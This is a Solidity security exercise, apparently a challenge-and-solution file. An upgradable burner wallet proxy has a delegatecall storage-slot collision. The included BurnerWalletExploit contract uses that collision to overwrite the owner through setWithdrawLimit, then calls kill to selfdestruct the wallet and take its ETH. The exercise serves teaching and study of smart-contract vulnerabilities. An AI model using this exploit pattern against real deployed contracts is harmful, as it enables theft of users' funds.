/*
BurnerWallet is upgradable, fowards all calls to BurnerWalletImplementation.

The owner of BurnerWallet can delete the contract by calling kill.

contract BurnerWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(owner);
    }
}

contract BurnerWalletImplementation {
    address public implementation;
    uint public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}

Task:
    - Drain all ETH from the wallet.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BurnerWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        // allows a contract to destroy itself and send any remaining Ether and gas to a specified Ethereum address
        selfdestruct(owner);
    }
}

contract BurnerWalletImplementation {
    address public implementation;
    uint public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}

interface IBurnerWallet {
    // declare any function that you need to call on BurnerWallet
    function kill() external;
    function setWithdrawLimit(uint) external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {}

    function pwn() external {
        // set owner to this contract
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        // kill to drain wallet
        IBurnerWallet(target).kill();
    }
}
